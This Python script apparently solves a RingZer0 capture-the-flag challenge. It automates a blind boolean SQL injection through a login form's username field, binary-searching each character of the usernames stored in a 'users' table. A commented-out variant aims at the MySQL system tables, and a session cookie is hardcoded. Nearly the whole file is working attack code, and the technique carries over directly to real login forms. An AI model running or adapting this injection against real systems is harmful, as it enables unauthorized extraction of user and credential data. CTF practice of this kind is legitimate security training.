#!/usr/bin/python
import requests
from bs4 import BeautifulSoup

target = "https://ringzer0ctf.com/challenges/52"
cookies = {'PHPSESSID':'s2dnqhc3ar4odqkn2vjtqgook1'}

wrong_user_msg = "Wrong username/password"
correct_user_msg = "Wrong password for"

username = "placeholder"
password = "placeholder"

# alter username
char_ascii = 0
last_ascii = 127

username_found = ""
password_found = ""
result = ""
num_of_chars = 1
column_name = "username"
offset = 0
exclude_default = ""
#exclude_default = "WHERE table_schema!='mysql' AND table_schema!='information_schema'"

i = 0

def main():
    while True: 
        char_num = binary_search(0, 127)
        if(char_num != -1 and char_num != 0):
            char = chr(char_num)
            #print(char_num)
            #print(char)
            global num_of_chars
            num_of_chars += 1
            global char_ascii
            char_ascii = 0
            global result
            result += char

        elif (char_num == -1 or char_num == 0) and len(result) > 0:
            print((column_name + ": " + result))
            #global char_ascii 
            char_ascii = 0
            #global num_of_chars 
            num_of_chars = 1
            global offset 
            offset += 1
            #global result 
            result = ""

        elif (char_num == -1 or char_num == 0) and len(result) == 0:
            break

def binary_search(l, r):
    if (r >= l):
        global char_ascii 
        char_ascii = l + ((r - l) / 2)
        if (query_server(char_ascii, "=")):
            return char_ascii
        elif (query_server(char_ascii, ">")):
            return binary_search(char_ascii+1, r)
        else:
            return binary_search(l, char_ascii-1)
    else:
        return -1

def query_server(char_ascii, operation):
    char = chr(int(char_ascii))
    #query = "' OR if((SELECT ascii(substr("+ column_name +", "+ str(num_of_chars) +",1 )) FROM mysql "+ exclude_default +" AND table_name='user'  LIMIT 1 OFFSET "+ str(offset) +") "+ operation +" ascii('"+char+"'),1,0)=1 #" 
    query = "' OR if((SELECT ascii(substr("+ column_name +", "+ str(num_of_chars) +",1 )) FROM users LIMIT 1 OFFSET "+ str(offset) +") "+ operation +" ascii('"+char+"'),1,0)=1 #" 
    username = query
    data = {'username': username, 'password': password}
    r = requests.post(url = target, data = data, cookies = cookies)
    response = r.text
 
    # Debugging:
    #print(response)
    #print(char)
    #print(query)   response = r.text
    #print_alert(response)

    if correct_user_msg in response:
        return True
    else:
        return False

def print_alert(html):
    # Modify this filter to what you believe our loot
    # should look like
    if("FLAG" in html):
        print(html)
    soup = BeautifulSoup(html, 'html.parser')
    # Modify the following functions to print the
    # output message that you are looking for
    results = soup.find("div", {"class":"alert"})
    if (results != None):
       result = results.text.strip()
       print(result)

main()
